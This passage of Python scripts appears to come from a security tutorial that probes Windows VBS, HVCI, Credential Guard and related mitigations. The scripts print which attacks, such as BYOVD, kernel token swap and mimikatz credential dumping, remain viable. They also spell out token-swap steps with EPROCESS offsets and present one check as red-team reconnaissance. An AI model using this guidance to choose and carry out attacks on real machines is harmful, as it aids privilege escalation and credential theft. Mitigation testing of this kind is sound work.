    except json.JSONDecodeError:
        print(f"  [!] Parse error: {output[:200]}")
        return {}

    # VBS Status
    vbs_status_map = {0: "Disabled", 1: "Enabled (not running)", 2: "Running"}
    vbs_val = data.get("VirtualizationBasedSecurityStatus", -1)
    status_str = vbs_status_map.get(vbs_val, f"Unknown ({vbs_val})")
    icon = "+" if vbs_val == 2 else "-" if vbs_val == 0 else "~"
    print(f"  [{icon}] VBS Status:      {status_str}")

    # Security Services
    svc_map = {1: "Credential Guard", 2: "HVCI", 3: "UEFI Lock",
               4: "SMM Firmware Protection", 5: "Secure Launch",
               6: "Kernel DMA Protection"}

    configured = data.get("SecurityServicesConfigured", [])
    running    = data.get("SecurityServicesRunning", [])

    print(f"\n  Configured Services:")
    for svc in (configured or []):
        name = svc_map.get(svc, f"Unknown ({svc})")
        is_running = svc in (running or [])
        icon = "+" if is_running else "-"
        state = "RUNNING" if is_running else "configured but NOT running"
        print(f"    [{icon}] {name}: {state}")

    if running:
        print(f"\n  Running Services:")
        for svc in running:
            print(f"    [+] {svc_map.get(svc, f'Service {svc}')}")

    return data

def check_hvci_status():
    """Check HVCI (Memory Integrity) via registry."""
    print("\n" + "=" * 65)
    print("  HVCI (Hypervisor-Protected Code Integrity) Status")
    print("=" * 65)

    reg_query = (
        "try { "
        "$val = Get-ItemProperty "
        "-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"
        "\\Scenarios\\HypervisorEnforcedCodeIntegrity' "
        "-Name 'Enabled' -ErrorAction Stop; "
        "Write-Output $val.Enabled "
        "} catch { Write-Output 'NOT_CONFIGURED' }"
    )
    output, _ = run_ps(reg_query)

    if output == "1":
        print("  [+] HVCI: ENABLED (unsigned kernel code blocked)")
        print("  [+] Implication: Kernel shellcode attacks will fail")
        print("  [+] Attacker must use: data-only attacks or BYOVD")
    elif output == "0":
        print("  [-] HVCI: DISABLED (unsigned kernel code allowed)")
        print("  [-] Implication: Kernel shellcode attacks are viable")
    else:
        print(f"  [~] HVCI: {output} (may not be configured via registry)")

    return output

def check_credential_guard(vbs_data):
    """Check Credential Guard status (registry + actual running state)."""
    print("\n" + "=" * 65)
    print("  Credential Guard Status")
    print("=" * 65)

    # Check registry configuration
    query = (
        "try { "
        "$lsa = Get-ItemProperty "
        "-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
        "-Name 'LsaCfgFlags' -ErrorAction Stop; "
        "Write-Output $lsa.LsaCfgFlags "
        "} catch { Write-Output 'NOT_SET' }"
    )
    output, _ = run_ps(query)

    cfg_map = {"0": "Disabled", "1": "Enabled with UEFI lock",
               "2": "Enabled without lock"}
    status = cfg_map.get(output, f"Unknown ({output})")

    # Check if actually running (from WMI data)
    running = vbs_data.get("SecurityServicesRunning", [])
    cg_running = 1 in running

    # Check Windows edition
    edition_query = "Get-ComputerInfo | Select-Object -ExpandProperty WindowsEditionId"
    edition, _ = run_ps(edition_query)
    is_enterprise = "Enterprise" in edition or "Education" in edition

    print(f"  Registry Config: {status}")
    print(f"  Actually Running: {'YES' if cg_running else 'NO'}")
    print(f"  Windows Edition: {edition.strip()}")

    if output in ("1", "2") and cg_running:
        print(f"  [+] Credential Guard: ACTIVE")
        print("  [+] Implication: mimikatz sekurlsa::logonpasswords will fail")
        print("  [+] NTLM hashes isolated in VTL 1 (Secure World)")
    elif output in ("1", "2") and not cg_running:
        print(f"  [!] Credential Guard: CONFIGURED but NOT RUNNING")
        if not is_enterprise:
            print("  [!] Reason: Windows Pro/Home does not support Credential Guard")
            print("  [!] Requires: Windows Enterprise or Education edition")
        else:
            print("  [!] Check Event Viewer for errors:")
            print("      Applications and Services Logs -> Microsoft -> Windows -> DeviceGuard")
        print("  [-] Implication: LSASS credential dumping IS POSSIBLE")
    else:
        print(f"  [-] Credential Guard: {status}")
        print("  [-] Implication: LSASS credential dumping is possible")

    return cg_running

def check_secure_boot():
    """Check Secure Boot status (required for VBS integrity)."""
    print("\n" + "=" * 65)
    print("  Secure Boot Status")
    print("=" * 65)

    output, _ = run_ps("Confirm-SecureBootUEFI")
    if "True" in output:
        print("  [+] Secure Boot: ENABLED")
        print("  [+] UEFI bootkit attacks (BlackLotus) mitigated")
    elif "False" in output:
        print("  [-] Secure Boot: DISABLED")
        print("  [-] VBS can be bypassed by firmware-level attacks")
    else:
        print(f"  [?] Secure Boot: {output}")

def check_speculation_mitigations():
    """Check CPU speculation attack mitigations."""
    print("\n" + "=" * 65)
    print("  CPU Speculation Mitigations (Meltdown/Spectre)")
    print("=" * 65)

    query = (
        "try { "
        "$spec = Get-SpeculationControlSettings 2>$null; "
        "$spec | ConvertTo-Json -Depth 3 "
        "} catch { Write-Output 'MODULE_NOT_FOUND' }"
    )
    output, _ = run_ps(query)

    if "MODULE_NOT_FOUND" in output or not output:
        print("  [!] SpeculationControl module not installed")
        print("  [*] Install: Install-Module -Name SpeculationControl -Force")
        return

    try:
        data = json.loads(output)
        checks = [
            ("KVAShadowWindowsSupportEnabled", "KVA Shadow (Meltdown)"),
            ("BTIWindowsSupportEnabled",       "BTI Mitigation (Spectre v2)"),
            ("BTIHardwarePresent",             "BTI Hardware (IBRS/IBPB)"),
            ("SSBDHardwarePresent",            "SSBD (Spectre v4)"),
            ("L1TFWindowsSupportEnabled",      "L1TF Mitigation (Foreshadow)"),
            ("MDSWindowsSupportEnabled",       "MDS Mitigation (Zombieload)"),
        ]
        for key, name in checks:
            val = data.get(key, "N/A")
            icon = "+" if val == True else "-" if val == False else "?"
            print(f"  [{icon}] {name}: {val}")
    except json.JSONDecodeError:
        print(f"  [!] Could not parse: {output[:200]}")

def exploitation_decision_tree(vbs_data):
    """Based on detected mitigations, show what attack paths remain."""
    print("\n" + "=" * 65)
    print("  EXPLOITATION DECISION TREE")
    print("=" * 65)

    vbs_val = vbs_data.get("VirtualizationBasedSecurityStatus", 0)
    running = vbs_data.get("SecurityServicesRunning", [])

    hvci_on = 2 in (running or [])
    cg_on   = 1 in (running or [])

    print("\n  Based on detected configuration:\n")

    if vbs_val != 2:
        print("  VBS is OFF:")
        print("    -> Kernel shellcode injection is viable")
        print("    -> unsigned driver loading is possible")
        print("    -> LSASS credential dumping works")
        print("    -> Token manipulation is straightforward")
        print("    -> Recommended attack: classic kernel exploit + shellcode")
    else:
        print("  VBS is ON:")
        if hvci_on:
            print("    HVCI ENABLED:")
            print("      [-] Kernel shellcode -> BLOCKED")
            print("      [-] Unsigned driver load -> BLOCKED")
            print("      [+] BYOVD (signed vulnerable driver) -> VIABLE")
            print("      [+] Data-only attack (token swap) -> VIABLE")
            print("      [+] Logic bugs in signed code -> VIABLE")
        if cg_on:
            print("    CREDENTIAL GUARD ENABLED:")
            print("      [-] mimikatz logonpasswords -> BLOCKED")
            print("      [-] NTLM hash extraction -> BLOCKED")
            print("      [+] Kerberos ticket relay -> VIABLE")
            print("      [+] Token impersonation -> VIABLE")
            print("      [+] Phishing for credentials -> VIABLE")

        if not hvci_on and not cg_on:
            print("    No security services running in VBS")
            print("    -> VBS infrastructure present but unused")

    print("\n  Key insight: Modern exploitation is about finding")
    print("  the GAPS between mitigation layers, not brute-forcing through them.")

def main():
    print("=" * 65)
    print("  VBS / HVCI / Credential Guard Mitigation Probe")
    print("  Run as Administrator on target Windows machine")
    print("=" * 65)

    if os.name != "nt":
        print("\n  [!] This script must be run on Windows.")
        print("  [*] On Linux/macOS, use this via:")
        print("      python -c \"from pwn import *; ...\"")
        print("      to probe remote Windows targets via network.")
        print("\n  Showing expected output structure for reference...\n")
        # Demo mode with placeholder output
        print("  [+] VBS Status:           Running")
        print("  [+] HVCI:                 ENABLED")
        print("  [+] Credential Guard:     Enabled with UEFI lock")
        print("  [+] Secure Boot:          ENABLED")
        print("  [-] Speculation (Spectre): Install SpeculationControl module")
        return

    vbs_data = check_vbs_status()
    check_hvci_status()
    check_credential_guard(vbs_data)
    check_secure_boot()
    check_speculation_mitigations()
    exploitation_decision_tree(vbs_data)

if __name__ == "__main__":
    main()
```

#### HVCI Driver Load Tester

```python
#!/usr/bin/env python3
"""
hvci_driver_test.py — Test HVCI enforcement against driver loading attempts
Demonstrates: How HVCI blocks unsigned kernel code.

This script:
  1. Creates a dummy (unsigned) .sys file
  2. Attempts to register and start it as a kernel service
  3. Monitors the Code Integrity event log for block events
  4. Tests a known signed driver (if available) to show BYOVD path
  5. Reports whether HVCI enforcement is active

Requirements: Run as Administrator on Windows with HVCI capable hardware
Usage: python hvci_driver_test.py
"""
import subprocess
import os
import sys
import tempfile
import struct
import time

def run_cmd(cmd, shell=True):
    """Run a shell command and return (stdout, returncode)."""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True, timeout=30
        )
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), -1

def run_ps(command):
    """Run a PowerShell command."""
    return run_cmd(f'powershell -NoProfile -Command "{command}"')

def create_dummy_driver(path):
    """
    Create a minimal dummy .sys file (invalid PE but non-zero).
    This is NOT a real driver — it will fail signature checks.
    """
    # Minimal DOS header + PE signature (enough for sc to try loading)
    # MZ header
    mz_header = b"MZ" + b"\x00" * 58 + struct.pack("<I", 64)  # e_lfanew = 64
    # PE signature
    pe_sig = b"PE\x00\x00"
    # COFF header (x64, 1 section, characteristics = EXECUTABLE | LARGE_ADDRESS_AWARE)
    coff = struct.pack("<HHIIIHH",
        0x8664,   # Machine: AMD64
        1,        # NumberOfSections
        0,        # TimeDateStamp
        0,        # PointerToSymbolTable
        0,        # NumberOfSymbols
        0xF0,     # SizeOfOptionalHeader
        0x0022    # Characteristics: EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
    )
    # Fill the rest with zeros to make it PE-shaped but unsigned
    padding = b"\x00" * 4096

    with open(path, "wb") as f:
        f.write(mz_header + pe_sig + coff + padding)

    print(f"  [*] Created dummy driver: {path} ({os.path.getsize(path)} bytes)")

def test_unsigned_driver(driver_path):
    """Attempt to load an unsigned driver and observe HVCI response."""
    print("\n" + "=" * 60)
    print("  TEST 1: Unsigned Driver Loading")
    print("=" * 60)

    svc_name = "HVCITestUnsigned"

    # Clean up any previous test
    run_cmd(f"sc delete {svc_name}")
    time.sleep(1)

    # Register the service
    print(f"  [*] Registering service: {svc_name}")
    stdout, stderr, rc = run_cmd(
        f'sc create {svc_name} type= kernel binPath= "{driver_path}"'
    )
    print(f"  [*] sc create: {stdout or stderr} (rc={rc})")

    if rc != 0:
        print(f"  [!] Failed to create service — need Administrator")
        return "ADMIN_REQUIRED"

    # Attempt to start
    print(f"  [*] Attempting to start unsigned driver...")
    stdout, stderr, rc = run_cmd(f"sc start {svc_name}")
    print(f"  [*] sc start: {stdout or stderr} (rc={rc})")

    # Check Code Integrity event log
    print(f"  [*] Checking Code Integrity event log...")
    ps_query = (
        "Get-WinEvent -LogName 'Microsoft-Windows-CodeIntegrity/Operational' "
        "-MaxEvents 5 2>$null | "
        "Where-Object { $_.Id -in @(3077, 3089) } | "
        "Select-Object TimeCreated, Id, Message | "
        "Format-List"
    )
    log_out, _, _ = run_ps(ps_query)
    if log_out:
        print(f"  [+] HVCI Block Events Found:")
        for line in log_out.split("\n")[:10]:
            print(f"      {line}")
        result = "BLOCKED_BY_HVCI"
    else:
        if rc != 0:
            print(f"  [~] Driver failed to load (not a valid driver) but no HVCI event")
            print(f"      This means the PE was rejected before HVCI checks")
            result = "REJECTED_PRE_HVCI"
        else:
            print(f"  [-] Driver loaded! HVCI may not be active")
            result = "LOADED"

    # Cleanup
    run_cmd(f"sc stop {svc_name}")
    run_cmd(f"sc delete {svc_name}")

    return result

def check_byovd_blocklist():
    """Check if the Microsoft Vulnerable Driver Blocklist is active."""
    print("\n" + "=" * 60)
    print("  TEST 2: Vulnerable Driver Blocklist Status")
    print("=" * 60)

    # Check if blocklist is enabled
    ps_cmd = (
        "try { "
        "$ci = Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config' "
        "-Name 'VulnerableDriverBlocklistEnable' -EA Stop; "
        "Write-Output $ci.VulnerableDriverBlocklistEnable "
        "} catch { Write-Output 'NOT_SET' }"
    )
    output, _, _ = run_ps(ps_cmd)

    if output == "1":
        print("  [+] Vulnerable Driver Blocklist: ENABLED")
        print("  [+] Known BYOVD drivers (Capcom.sys, DBUtil, etc.) are blocked")
        print("  [*] Full list: https://learn.microsoft.com/en-us/windows/"
              "security/application-security/application-control/"
              "windows-defender-application-control/design/"
              "microsoft-recommended-driver-block-rules")
    elif output == "0":
        print("  [-] Vulnerable Driver Blocklist: DISABLED")
        print("  [-] BYOVD attacks with known vulnerable drivers are possible")
    else:
        print(f"  [?] Blocklist status: {output}")
        print("  [*] On Windows 11 22H2+, the blocklist is enabled by default")

def check_ci_policy():
    """Check Code Integrity policy enforcement level."""
    print("\n" + "=" * 60)
    print("  TEST 3: Code Integrity Policy")
    print("=" * 60)

    ps_cmd = (
        "Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard | "
        "Select-Object -Property "
        "CodeIntegrityPolicyEnforcementStatus, "
        "UsermodeCodeIntegrityPolicyEnforcementStatus | "
        "ConvertTo-Json -Compress"
    )
    output, _, rc = run_ps(ps_cmd)

    if rc == 0 and output:
        try:
            import json
            data = json.loads(output)
            kernel_ci = data.get("CodeIntegrityPolicyEnforcementStatus", "N/A")
            user_ci = data.get("UsermodeCodeIntegrityPolicyEnforcementStatus", "N/A")
            ci_map = {0: "Off", 1: "Audit", 2: "Enforced"}

            print(f"  Kernel-mode CI: {ci_map.get(kernel_ci, kernel_ci)}")
            print(f"  User-mode CI:   {ci_map.get(user_ci, user_ci)}")

            if kernel_ci == 2:
                print("  [+] Kernel CI is ENFORCED (HVCI active)")
                print("  [+] Only signed kernel code can execute")
            elif kernel_ci == 1:
                print("  [~] Kernel CI in AUDIT mode (logs but doesn't block)")
            else:
                print("  [-] Kernel CI is OFF")

        except Exception as e:
            print(f"  [!] Parse error: {e}")
            print(f"  [!] Raw output: {output[:200]}")
    else:
        print("  [!] Could not query CI policy")

def main():
    print("=" * 60)
    print("  HVCI Driver Loading Enforcement Tester")
    print("  Must be run as Administrator")
    print("=" * 60)

    if os.name != "nt":
        print("\n  [!] This script must be run on Windows.")
        print("  [*] Expected behavior with HVCI:")
        print("      - Unsigned .sys -> BLOCKED (Event ID 3077)")
        print("      - Signed vulnerable .sys -> ALLOWED (BYOVD risk!)")
        print("      - Blocklisted .sys -> BLOCKED (if blocklist enabled)")
        return

    # Create temp directory for test files
    test_dir = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "hvci_test")
    os.makedirs(test_dir, exist_ok=True)
    driver_path = os.path.join(test_dir, "test_unsigned.sys")

    try:
        create_dummy_driver(driver_path)
        result = test_unsigned_driver(driver_path)

        check_byovd_blocklist()
        check_ci_policy()

        # Final summary
        print("\n" + "=" * 60)
        print("  SUMMARY")
        print("=" * 60)
        if result == "BLOCKED_BY_HVCI":
            print("  [+] HVCI is ACTIVE — unsigned kernel code is blocked")
            print("  [+] Attack vector: BYOVD with signed vulnerable drivers")
        elif result == "REJECTED_PRE_HVCI":
            print("  [~] Driver rejected before HVCI check (invalid PE)")
            print("  [*] HVCI is likely active (check TEST 3 results above)")
            print("  [*] Real unsigned drivers would trigger Event ID 3077")
        elif result == "LOADED":
            print("  [-] Driver was allowed to load — HVCI may not be active")
        else:
            print(f"  [?] Test result: {result}")

        print("\n  [*] Note: To definitively test HVCI, use a real unsigned driver")
        print("  [*] Example: Compile a minimal WDM driver without signing")
        print("  [*] With HVCI on, you'll see Event ID 3077 in Code Integrity log")

    finally:
        # Cleanup
        try:
            os.remove(driver_path)
            os.rmdir(test_dir)
        except OSError:
            pass

if __name__ == "__main__":
    main()
```

#### Kernel Token Attack Simulator

```python
#!/usr/bin/env python3
"""
token_attack_sim.py — Simulate kernel token swap attack and VBS protection
Demonstrates: The exact technique used in CVE-2024-21338, CVE-2023-28252.

This script simulates the attacker's view of a kernel privilege escalation:
  1. Read current process token info
  2. Find SYSTEM token (via NtQuerySystemInformation)
  3. Demonstrate what the kernel read/write primitive would do
  4. Show how VBS/KDP would block the token overwrite

NOTE: This does NOT actually perform kernel exploitation. It simulates
the information gathering and demonstrates protection concepts using
user-mode APIs that mirror what kernel exploits do.

Usage: python token_attack_sim.py
"""
import ctypes
import ctypes.wintypes as wt
import struct
import sys
import os

if os.name != "nt":
    print("This script runs on Windows only.")
    print("\nSimulated output showing attack concept:\n")
    print("=" * 60)
    print("  Kernel Token Swap Attack Simulation")
    print("=" * 60)
    print("""
  Phase 1: Information Gathering
  ─────────────────────────────
  Current PID:        12345
  Current User:       DESKTOP\\user
  Token Type:         Primary
  Integrity Level:    Medium
  Privileges:         SeChangeNotifyPrivilege (enabled)
                      SeIncreaseWorkingSetPrivilege (disabled)

  SYSTEM PID:         4
  SYSTEM Token:       [requires kernel read primitive]

  Phase 2: Attack Simulation
  ──────────────────────────
  Without VBS:
    1. Use kernel R/W to read SYSTEM EPROCESS at 0xFFFF8001`23456789
    2. Read SYSTEM Token at EPROCESS+0x4B8: 0xFFFFAB01`DEADBEEF
    3. Overwrite current EPROCESS+0x4B8 with SYSTEM token
    4. Result: Current process is now SYSTEM +

  With VBS + KDP (if token is KDP-protected):
    1. Same kernel R/W primitive
    2. Read SYSTEM Token: succeeds (VBS allows reads from VTL 0)
    3. Attempt overwrite: BLOCKED by hypervisor
    4. Result: BSOD (KDP violation) -

  With VBS but WITHOUT KDP on Token:
    1. Same kernel R/W primitive
    2. Read SYSTEM Token: succeeds
    3. Overwrite current Token: SUCCEEDS (Token not KDP-registered!)
    4. Result: Current process is SYSTEM +
    This is exactly what CVE-2024-21338 exploited!
""")
    sys.exit(0)

# ── Windows API Setup ──
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
ntdll    = ctypes.WinDLL("ntdll",    use_last_error=True)

# Constants
TOKEN_QUERY = 0x0008
TokenUser = 1
TokenIntegrityLevel = 25
TokenPrivileges = 3
TokenStatistics = 10
ProcessBasicInformation = 0

class TOKEN_USER(ctypes.Structure):
    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Sid", ctypes.c_void_p), ("Attributes", wt.DWORD)]
    _fields_ = [("User", SID_AND_ATTRIBUTES)]

class TOKEN_STATISTICS(ctypes.Structure):
    _fields_ = [
        ("TokenId", ctypes.c_uint64),
        ("AuthenticationId", ctypes.c_uint64),
        ("ExpirationTime", ctypes.c_int64),
        ("TokenType", ctypes.c_int),
        ("ImpersonationLevel", ctypes.c_int),
        ("DynamicCharged", wt.DWORD),
        ("DynamicAvailable", wt.DWORD),
        ("GroupCount", wt.DWORD),
        ("PrivilegeCount", wt.DWORD),
        ("ModifiedId", ctypes.c_uint64),
    ]

def get_current_token_info():
    """Read current process token information."""
    hToken = wt.HANDLE()
    hProcess = kernel32.GetCurrentProcess()

    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        err = ctypes.get_last_error()
        print(f"  [!] OpenProcessToken failed: {err}")
        if err == 5:  # ERROR_ACCESS_DENIED
            print(f"  [!] Access denied - try running as Administrator")
        return False

    # Get token user (SID -> Username)
    buf_size = wt.DWORD(0)
    advapi32.GetTokenInformation(hToken, TokenUser, None, 0, ctypes.byref(buf_size))
    buf = ctypes.create_string_buffer(buf_size.value)
    if not advapi32.GetTokenInformation(hToken, TokenUser, buf, buf_size, ctypes.byref(buf_size)):
        print(f"  [!] GetTokenInformation failed: {ctypes.get_last_error()}")
        kernel32.CloseHandle(hToken)
        return False

    tu = ctypes.cast(buf, ctypes.POINTER(TOKEN_USER)).contents
    name_buf = ctypes.create_unicode_buffer(256)
    domain_buf = ctypes.create_unicode_buffer(256)
    name_size = wt.DWORD(256)
    domain_size = wt.DWORD(256)
    sid_use = wt.DWORD(0)

    if advapi32.LookupAccountSidW(
        None, tu.User.Sid,
        name_buf, ctypes.byref(name_size),
        domain_buf, ctypes.byref(domain_size),
        ctypes.byref(sid_use)
    ):
        print(f"  Current User:     {domain_buf.value}\\{name_buf.value}")
    else:
        print(f"  Current User:     [Could not resolve SID]")

    # Get token statistics
    stats = TOKEN_STATISTICS()
    ret_len = wt.DWORD(0)
    if advapi32.GetTokenInformation(
        hToken, TokenStatistics,
        ctypes.byref(stats), ctypes.sizeof(stats), ctypes.byref(ret_len)
    ):
        token_type = "Primary" if stats.TokenType == 1 else "Impersonation"
        print(f"  Token Type:       {token_type}")
        print(f"  Token ID:         0x{stats.TokenId:016X}")
        print(f"  Auth ID:          0x{stats.AuthenticationId:016X}")
        print(f"  Privilege Count:  {stats.PrivilegeCount}")

    # Get integrity level
    buf_size = wt.DWORD(0)
    advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, None, 0, ctypes.byref(buf_size))
    buf = ctypes.create_string_buffer(buf_size.value)
    if advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, buf, buf_size, ctypes.byref(buf_size)):
        # Parse the integrity SID
        sid_ptr = ctypes.cast(buf, ctypes.POINTER(ctypes.c_void_p)).contents
        sub_auth_count = ctypes.cast(sid_ptr, ctypes.POINTER(ctypes.c_ubyte))[1]
        if sub_auth_count > 0:
            # Last sub-authority contains the integrity level RID
            rid_offset = 8 + (sub_auth_count - 1) * 4
            rid = struct.unpack_from("<I", ctypes.string_at(sid_ptr, rid_offset + 4), rid_offset)[0]
            level_map = {
                0x0000: "Untrusted", 0x1000: "Low",
                0x2000: "Medium",    0x3000: "High",
                0x4000: "System"
            }
            level = level_map.get(rid, f"Custom (0x{rid:04X})")
            print(f"  Integrity Level:  {level}")

    kernel32.CloseHandle(hToken)
    return True

def simulate_token_attack():
    """Simulate what a kernel exploit would do for token swap."""
    print("\n  Phase 2: Kernel Token Swap Simulation")
    print("  " + "-" * 50)
    print("\n  What a kernel exploit (e.g., CVE-2024-21338) does:")
    print()

    pid = kernel32.GetCurrentProcessId()
    print(f"  1. Current PID: {pid}")
    print(f"     -> Kernel: PsLookupProcessByProcessId({pid})")
    print(f"     -> Returns EPROCESS pointer (e.g., 0xFFFF8001`AABBCCDD)")
    print()
    print(f"  2. SYSTEM PID: 4")
    print(f"     -> Kernel: PsLookupProcessByProcessId(4)")
    print(f"     -> Returns SYSTEM EPROCESS (e.g., 0xFFFF8001`12345678)")
    print()
    print(f"  3. Token offset in EPROCESS (Windows 11 22H2+): +0x4B8")
    print(f"     -> Read SYSTEM EPROCESS+0x4B8 = SYSTEM Token")
    print(f"     -> Token value contains RefCnt in low 4 bits")
    print()
    print(f"  4. Token swap:")
    print(f"     -> Write SYSTEM Token -> current EPROCESS+0x4B8")
    print(f"     -> Current process now has SYSTEM privileges!")
    print()
    print(f"  5. Spawn elevated cmd.exe")
    print(f"     -> CreateProcess('cmd.exe') inherits SYSTEM token")

    print("\n  Protection Analysis:")
    print("  " + "-" * 50)
    print("  VBS OFF:  Token swap SUCCEEDS (no protection)")
    print("  HVCI ON:  Token swap SUCCEEDS (HVCI protects CODE, not DATA)")
    print("  KDP ON:   Token swap FAILS *only if Token is KDP-registered*")
    print()
    print("  REALITY: EPROCESS.Token is NOT KDP-protected in current Windows")
    print("  This is why CVE-2024-21338 worked even with VBS+HVCI enabled!")

def check_vbs_impact():
    """Check if VBS would block this attack on the current system."""
    print("\n  Phase 3: Protection Check")
    print("  " + "-" * 50)

    import subprocess
    query = (
        "Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard | "
        "Select-Object VirtualizationBasedSecurityStatus, "
        "SecurityServicesRunning | ConvertTo-Json"
    )
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", query],
            capture_output=True, text=True, timeout=15
        )
        import json
        data = json.loads(result.stdout)
        vbs = data.get("VirtualizationBasedSecurityStatus", 0)
        running = data.get("SecurityServicesRunning", [])
        hvci = 2 in (running or [])

        print(f"  VBS Status:  {'Running' if vbs == 2 else 'Not running'}")
        print(f"  HVCI:        {'Enabled' if hvci else 'Disabled'}")
        print()

        if vbs == 2 and hvci:
            print("  [!] VBS+HVCI active, BUT:")
            print("      Token swap attack STILL WORKS!")
            print("      EPROCESS.Token is not KDP-protected.")
            print("      Only data-only attack prevention (future KDP) would stop this.")
        else:
            print("  [-] VBS/HVCI not fully active")
            print("      Kernel shellcode AND token swap attacks are both viable")
    except Exception:
        print("  [!] Could not query VBS status")

def main():
    print("=" * 60)
    print("  Kernel Token Swap Attack Simulation")
    print("  (Educational — does NOT perform actual kernel exploitation)")
    print("=" * 60)

    print("\n  Phase 1: Information Gathering")
    print("  " + "-" * 50)
    print(f"  Current PID:      {kernel32.GetCurrentProcessId()}")

    # Try to get token info, but continue even if it fails
    token_success = get_current_token_info()
    if not token_success:
        print("\n  [*] Continuing with simulation (token info not critical)...")

    simulate_token_attack()
    check_vbs_impact()

    print("\n" + "=" * 60)
    print("  Lab Exercise: Compare this output with/without VBS")
    print("  1. Run with VBS disabled -> note that attack is trivially viable")
    print("  2. Enable VBS+HVCI -> note attack is STILL viable (data-only)")
    print("  3. This proves: HVCI protects code integrity, NOT data integrity")
    print("\n  Note: For full token details, run as Administrator")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

#### Remote Credential Guard Verifier

```python
#!/usr/bin/env python3
"""
cred_guard_verifier.py — Remotely verify Credential Guard enforcement
Demonstrates: How Credential Guard blocks credential extraction.

This script connects to a remote Windows host via WinRM/SMB and
attempts to enumerate credential protection. Useful for red team
reconnaissance to determine if mimikatz-style attacks will work.

For local testing, it probes LSASS protection status.

Usage:
  # Local check
  python cred_guard_verifier.py

  # Remote check (requires credentials)
  python cred_guard_verifier.py --target 192.168.1.100 --user admin --pass P@ssw0rd
"""
import subprocess
import sys
import os
import argparse

def local_check():
    """Check Credential Guard status on the local machine."""
    print("\n" + "=" * 60)
    print("  Local Credential Guard Analysis")
    print("=" * 60)

    checks = [
        {
            "name": "Credential Guard Registry",
            "cmd": (
                "try { $v = (Get-ItemProperty "
                "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
                "-Name LsaCfgFlags -EA Stop).LsaCfgFlags; "
                "if ($v -ge 1) { 'ENABLED' } else { 'DISABLED' } "
                "} catch { 'NOT_CONFIGURED' }"
            ),
        },
        {
            "name": "LSASS Protection (RunAsPPL)",
            "cmd": (
                "try { $v = (Get-ItemProperty "
                "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
                "-Name RunAsPPL -EA Stop).RunAsPPL; "
                "if ($v -ge 1) { 'ENABLED (value=' + $v + ')' } else { 'DISABLED' } "
                "} catch { 'NOT_CONFIGURED' }"
            ),
        },
        {
            "name": "VBS Security Services",
            "cmd": (
                "(Get-CimInstance -ClassName Win32_DeviceGuard "
                "-Namespace root/Microsoft/Windows/DeviceGuard)."
                "SecurityServicesRunning -join ','"
            ),
        },
        {
            "name": "LSASS Process Protection",
            "cmd": (
                "$lsass = Get-Process lsass -EA SilentlyContinue; "
                "if ($lsass) { "
                "'PID=' + $lsass.Id + ' Handles=' + $lsass.HandleCount "
                "} else { 'Cannot access LSASS (good — it is protected)' }"
            ),
        },
        {
            "name": "WDigest Credential Caching",
            "cmd": (
                "try { $v = (Get-ItemProperty "
                "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' "
                "-Name UseLogonCredential -EA Stop).UseLogonCredential; "
                "if ($v -eq 1) { 'ENABLED (cleartext creds in memory!)' } "
                "else { 'DISABLED (good)' } "
                "} catch { 'NOT_SET (default: disabled on Win10+)' }"
            ),
        },
    ]

    results = []
    for check in checks:
        try:
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", check["cmd"]],
                capture_output=True, text=True, timeout=15
            )
            output = result.stdout.strip()
        except Exception as e:
            output = f"Error: {e}"

        # Better icon logic
        if "Credential Guard" in check["name"]:
            icon = "+" if "ENABLED" in output else "-"
        elif "RunAsPPL" in check["name"]:
            icon = "+" if "ENABLED" in output else "-"
        elif "Cannot access" in output or "DISABLED (good)" in output or "NOT_SET (default" in output:
            icon = "+"
        else:
            icon = "?"

        print(f"  [{icon}] {check['name']}: {output}")
        results.append((check["name"], output))

    # Exploitation impact summary
    print("\n  Credential Extraction Impact:")
    print("  " + "-" * 50)

    # Check if Credential Guard is ACTUALLY running (not just configured)
    vbs_services = next((r[1] for r in results if "VBS Security Services" in r[0]), "")
    cg_running = "1" in vbs_services.split(",")
    ppl_enabled = any("ENABLED" in r[1] for r in results if "RunAsPPL" in r[0])

    print(f"\n  Analysis:")
    print(f"    Credential Guard actually running: {'YES' if cg_running else 'NO'}")
    print(f"    LSASS RunAsPPL protection: {'YES' if ppl_enabled else 'NO'}")
    print(f"    VBS Services active: {vbs_services}")
    print()

    attacks = [
        ("mimikatz sekurlsa::logonpasswords",
         "BLOCKED" if cg_running else "VIABLE (CG not running)" if ppl_enabled else "VIABLE"),
        ("mimikatz sekurlsa::wdigest",
         "BLOCKED" if cg_running else "VIABLE"),
        ("LSASS process dump (comsvcs.dll)",
         "BLOCKED" if ppl_enabled else "VIABLE"),
        ("LSASS memory read (procdump)",
         "BLOCKED" if ppl_enabled else "VIABLE"),
        ("Kerberos ticket extraction",
         "BLOCKED" if cg_running else "VIABLE"),
        ("Pass-the-Hash",
         "BLOCKED" if cg_running else "VIABLE"),
        ("Kerberos delegation abuse",
         "VIABLE (not blocked by CG)"),
        ("Token impersonation",
         "VIABLE (not blocked by CG)"),
    ]

    for attack, status in attacks:
        icon = "-" if "BLOCKED" in status else "+"
        print(f"    [{icon}] {attack}: {status}")

def remote_check(target, username, password):
    """Check Credential Guard on a remote host via WinRM."""
